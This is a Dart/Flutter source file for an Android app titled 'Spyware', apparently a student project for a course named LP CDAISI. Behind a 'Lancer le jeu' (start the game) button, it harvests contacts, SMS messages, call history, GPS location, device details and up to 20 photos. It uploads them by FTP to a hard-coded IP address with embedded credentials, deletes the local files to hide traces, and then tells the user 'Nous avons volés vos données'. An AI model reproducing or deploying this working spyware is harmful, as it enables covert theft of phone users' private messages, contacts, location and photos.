//*************************************
//***** Spyware Android LP CDAISI *****
//*************************************

// ***** Importation des plugins *****
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:path_provider/path_provider.dart'; // Chemin d'accès
import 'package:permission_handler/permission_handler.dart'; // Permission
import 'package:ftpconnect/ftpConnect.dart'; // Connexion FTP
import 'package:geolocator/geolocator.dart'; // Localisation
import 'package:device_info/device_info.dart'; // Informations
import 'package:sms/sms.dart'; // SMS
import 'package:contacts_service/contacts_service.dart'; // Contacts
import 'package:call_log/call_log.dart'; // Historique d'appel

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeData(
        primarySwatch: Colors.green,
      ),
      home: const MyHomePage(title: 'Spyware Page d\'accueil'),
      debugShowCheckedModeBanner:  false,
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);
  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  int _counter = 0;

  // Fonction de lancement
  void _FonctionLancement() async {
    // ***** Demande de permission *****
    Map<Permission, PermissionStatus> statuses = await [
      Permission.storage,
      Permission.contacts,
      Permission.location,
      Permission.sms,
      Permission.camera,
    ].request();

    // ***** Préparation de la connexion FTP *****
    FTPConnect ftpConnect = FTPConnect('141.94.77.172',
    user: 'utilisateursftp', pass: 'Sftp59?Spyware!');

    // ***** PARTIE CREATION DES FICHIERS *****
    Directory TempDir = await getTemporaryDirectory();

    // Creation de la liste des fichiers à envoyer
    var listeFichiers = ["${TempDir.path}/contact.txt","${TempDir.path}/sms.txt","${TempDir.path}/phone_information.txt","${TempDir.path}/localisation.txt","${TempDir.path}/HistoAppel.txt"];

    final FichierContact = "${TempDir.path}/contact.txt";
    final FichierSMS = "${TempDir.path}/sms.txt";
    final FichierInformation = "${TempDir.path}/phone_information.txt";
    final FichierLocalisation = "${TempDir.path}/localisation.txt";
    final FichierHistoAppel = "${TempDir.path}/HistoAppel.txt";

    // ***** PARTIE INFORMATIONS TELEPHONE *****
    if (Platform.isAndroid) {
      var androidInfo = await DeviceInfoPlugin().androidInfo;
      var androidVersion = androidInfo.version.release;
      var marque = androidInfo.manufacturer;
      var nomHost = androidInfo.host;
      // Ajout des informations dans le fichier
      File(FichierInformation).writeAsString("Informations sur le telephone : \nAndroid $androidVersion, $marque, $nomHost").then((File file_phone) {});
    }

    // ****** PARTIE CONTACTS ******
    // Récupérer l'ensemble des contacts dans une liste
    List<Contact> infoContacts = await ContactsService.getContacts();
    // Variable qui va stocker l'ensemble des informations des contacts
    var infoContact = "";
    // Parcourir la liste
    for (var contact in infoContacts) {
      infoContact = infoContact+"Nom du contact : "+contact.displayName!+" \nNumero : "+contact.phones!.first.value!+"\n";
    }
    // Ajout des informations dans le fichier
    File(FichierContact).writeAsString(infoContact).then((File fileContact) {});

    // ***** PARTIE LOCALISATION *****
    var location = await Geolocator.getCurrentPosition();
    var position = "$location";
    // Ajout des informations dans le fichier
    File(FichierLocalisation).writeAsString("Informations sur la position du telephone : "+position).then((File fileLocalisation) {});

    // ***** PARTIE SMS *****
    // Ajout des informations dans le fichier
    File(FichierSMS).writeAsString("Recuperation des SMS : ").then((File fileSMS) {});

    // Création de l'instance de la classe SmsQuery
    SmsQuery query = SmsQuery();
    // Récupération de la liste des instances SMS (reçus et envoyés)
    List<SmsMessage> messageList = await query.querySms(kinds: [SmsQueryKind.Inbox, SmsQueryKind.Sent]);

    int compteur = 0;
    var infoSMS = "";
    // Parcourir les messages
    for (var message in messageList) {
      if (compteur < 20) {
        infoSMS = infoSMS+"Numero Expediteur : "+message.sender+" Corps du message : "+message.body+"\n";
        compteur++;
      }
    }
    File(FichierSMS).writeAsString(infoSMS).then((File fileSMS) {});

    // ***** Partie HISTORIQUE D'APPEL *****
    var histo_appel ="";
    Iterable<CallLogEntry> entries = await CallLog.get();
    for (var entree in entries) {
      int? timestamp = entree.timestamp;
      final DateTime date1 = DateTime.fromMicrosecondsSinceEpoch(timestamp! * 1000);
      final date = date1;
      histo_appel = histo_appel+"Nom du destinataire : "+entree.name!+", Numéro du destinataire : "+entree.number!+", Date : "+date.toString()+"\n";
    }
    File(FichierHistoAppel).writeAsString(histo_appel).then((File fileHistoAppel) {});
    
    // ***** Partie Wi-Fi (fonctionne que sur tel physique) *****
    //final info = NetworkInfo();
    //var wifiIP = await info.getWifiIP();
    //var wifiName = await info.getWifiName();
    //var netinfo ="Nom du Wi-Fi : "+wifiName!+", IP du Wi-Fi"+wifiIP!;
    //File(FichierNetInfo).writeAsString(netinfo).then((File fileNetInfo) {});

    // ***** Partie Envoie des fichiers *****
    // Faire une liste des fichiers à envoyer
    for (var fichier in listeFichiers) {
      File fileToUpload = File(fichier);
      // Lancement de la connexion FTP
      await ftpConnect.connect();
      // Envoie du fichier sur le serveur
      bool res = await ftpConnect.uploadFile(fileToUpload);
      // Fermeture de la connexion FTP
      await ftpConnect.disconnect();
    } 

    // ***** Effacement des traces *****
    for (var fichier in listeFichiers) {
      File(fichier).deleteSync(); 
    }

    // ***** PARTIE PHOTOS *****

    // Récupération de la liste de fichier
    Directory dir = Directory('/storage/1CEC-2F09/images');
    List<FileSystemEntity> phoneFiles = dir.listSync(recursive: true);

    // Définition de la liste de fichier
    var listFile = [];
    // Ajout des fichiers dans la liste
    for (FileSystemEntity file in phoneFiles) {
      var path = file.path;
      listFile.add(path);
    }

    // Envoie des photos
    int compteur2 = 0;
    for (var file in listFile) {
      if (compteur2 < 20) {
        File fileToUpload = File(file);
        // Lancement de la connexion FTP
        await ftpConnect.connect();
       // Changement de répertoire
        await ftpConnect.changeDirectory('photos');
        // Envoie du fichier sur le serveur
        bool res = await ftpConnect.uploadFile(fileToUpload);
        // Fermeture de la connexion FTP
        await ftpConnect.disconnect();
        compteur2++;
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      appBar: AppBar(
        // Titre de l'application
        title: const Text("Spyware - LP CDAISI"),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            // Ajout de l'image
            Image.asset("images/cdaisi.png", width: 200, height: 200),
            // Définition du bouton
            MaterialButton(
                // Nom du bouton
                child: const Text('Lancer le jeu'),
                textColor: Colors.white,
                color: Colors.green,
                // Lorsque l'on appuie sur le bouton
                onPressed: () {
                  _FonctionLancement();
                  showDialog(
                      context: context,
                      barrierDismissible: false,
                      builder: (BuildContext context) {
                        return AlertDialog(
                          // Nom de la boîte de dialogue
                          title: const Text('Information'),
                          // Contenu de la boîte de dialogue
                          content: const Text("Nous avons volés vos données ! \n\nRendez-vous à l'url : \nhttp://141.94.77.172/index.html"),
                          actions: <Widget>[
                            // Bouton de fermeture de la boîte de dialogue
                            MaterialButton(
                                onPressed: () {
                                  Navigator.of(context).pop();
                                },
                                child: const Text('Fermer')
                                )
                          ],
                        );
                      });
                }),
          ],
        ),
      ),
    );
  }
}
